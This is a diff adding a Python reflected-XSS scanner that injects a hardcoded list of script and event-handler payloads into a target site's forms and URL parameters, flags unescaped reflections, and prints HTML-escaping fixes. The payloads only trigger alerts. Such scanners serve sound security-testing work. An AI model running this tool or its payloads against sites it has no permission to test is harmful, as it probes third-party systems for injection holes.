@@ -1,0 +1,191 @@
+import sys
+import html
+import requests
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
+from bs4 import BeautifulSoup
+
+PAYLOADS = [
+    "<script>alert('XSS')</script>",
+    "\"><img src=x onerror=alert(1)>",
+    "'><svg onload=alert(1)>",
+    "<img src=x onerror=alert('XSS')>",
+    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+]
+
+DANGEROUS_CHARS = ["<", ">", '"', "'"]
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (compatible; SmartXSSScanner/1.0; +educational-use)"
+}
+
+TIMEOUT = 8
+
+def get_forms(url, session):
+    """Fetch a page and return a list of dicts describing each <form>."""
+    try:
+        resp = session.get(url, headers=HEADERS, timeout=TIMEOUT)
+    except requests.RequestException as e:
+        print(f"[!] Could not fetch {url}: {e}")
+        return []
+
+    soup = BeautifulSoup(resp.text, "html.parser")
+    forms = []
+    for form in soup.find_all("form"):
+        action = form.attrs.get("action", "")
+        method = form.attrs.get("method", "get").lower()
+        inputs = []
+        for tag in form.find_all(["input", "textarea", "select"]):
+            name = tag.attrs.get("name")
+            if not name:
+                continue
+            input_type = tag.attrs.get("type", "text")
+            default_value = tag.attrs.get("value", "")
+            inputs.append({"name": name, "type": input_type, "value": default_value})
+        forms.append({"action": action, "method": method, "inputs": inputs})
+    return forms
+
+
+
+def submit_form(base_url, form, payload, session):
+    """Fill every input in a form with the payload and submit it."""
+    target_url = urljoin(base_url, form["action"]) if form["action"] else base_url
+    data = {}
+    for field in form["inputs"]:
+        if field["type"] in ("submit", "button", "hidden"):
+            data[field["name"]] = field["value"]
+        else:
+            data[field["name"]] = payload
+
+    try:
+        if form["method"] == "post":
+            return session.post(target_url, data=data, headers=HEADERS, timeout=TIMEOUT)
+        else:
+            return session.get(target_url, params=data, headers=HEADERS, timeout=TIMEOUT)
+    except requests.RequestException as e:
+        print(f"[!] Request failed for {target_url}: {e}")
+        return None
+
+
+def inject_url_params(url, payload, session):
+    """Inject the payload into every existing query parameter of a URL."""
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+
+    if not params:
+        return None  
+
+    results = []
+    for param_name in params:
+        new_params = {k: v[0] for k, v in params.items()}
+        new_params[param_name] = payload
+        new_query = urlencode(new_params)
+        fuzzed_url = urlunparse(parsed._replace(query=new_query))
+        try:
+            resp = session.get(fuzzed_url, headers=HEADERS, timeout=TIMEOUT)
+            results.append((param_name, fuzzed_url, resp))
+        except requests.RequestException as e:
+            print(f"[!] Request failed for {fuzzed_url}: {e}")
+    return results
+
+
+def is_reflected_unescaped(response_text, payload):
+    """
+    Return True if the raw, unescaped payload appears in the response.
+    This means the app is NOT HTML-escaping user input -> likely XSS.
+    """
+    if payload in response_text:
+        return True
+
+    # Also check if it was reflected but properly escaped (safe) so we can
+    # tell the difference in the report.
+    escaped_payload = html.escape(payload)
+    if escaped_payload in response_text and payload not in response_text:
+        return False
+
+    return False
+
+
+def scan_forms(base_url, session, findings):
+    print(f"\n[*] Extracting forms from {base_url} ...")
+    forms = get_forms(base_url, session)
+    print(f"[*] Found {len(forms)} form(s).")
+
+    for form in forms:
+        for payload in PAYLOADS:
+            resp = submit_form(base_url, form, payload, session)
+            if resp is None:
+                continue
+            vulnerable = is_reflected_unescaped(resp.text, payload)
+            if vulnerable:
+                findings.append({
+                    "type": "form",
+                    "action": form["action"] or base_url,
+                    "method": form["method"],
+                    "payload": payload,
+                    "fields": [f["name"] for f in form["inputs"]],
+                })
+                break  
+
+
+def scan_url_params(url, session, findings):
+    print(f"\n[*] Fuzzing URL query parameters on {url} ...")
+    for payload in PAYLOADS:
+        results = inject_url_params(url, payload, session)
+        if not results:
+            print("[*] No query parameters found to fuzz.")
+            return
+        for param_name, fuzzed_url, resp in results:
+            if is_reflected_unescaped(resp.text, payload):
+                findings.append({
+                    "type": "url_param",
+                    "param": param_name,
+                    "url": fuzzed_url,
+                    "payload": payload,
+                })
+
+
+def print_report(findings):
+    print("\n" + "=" * 60)
+    print("SCAN REPORT")
+    print("=" * 60)
+
+    if not findings:
+        print("No unescaped reflections found with the tested payloads.")
+        print("(This does NOT guarantee the app is safe — try more payloads,")
+        print(" check DOM-based sinks with a headless browser, and test")
+        print(" stored/blind XSS separately.)")
+        return
+
+    for i, f in enumerate(findings, 1):
+        print(f"\n[VULN {i}] Likely Reflected XSS")
+        if f["type"] == "form":
+            print(f"  Form action : {f['action']}")
+            print(f"  Method      : {f['method'].upper()}")
+            print(f"  Fields      : {', '.join(f['fields'])}")
+        else:
+            print(f"  URL param   : {f['param']}")
+            print(f"  Test URL    : {f['url']}")
+        print(f"  Payload     : {f['payload']}")
+        print("  Fix         : HTML-encode all user input before rendering it,")
+        print("                e.g. Python: html.escape(user_input)")
+        print("                Flask/Jinja2 autoescaping is ON by default —")
+        print("                make sure you aren't using |safe on user data.")
+
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 xss_scanner.py <target_url>")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    session = requests.Session()
+    findings = []
+
+    scan_forms(target_url, session, findings)
+    scan_url_params(target_url, session, findings)
+    print_report(findings)
+
+
+if __name__ == "__main__":
+    main()
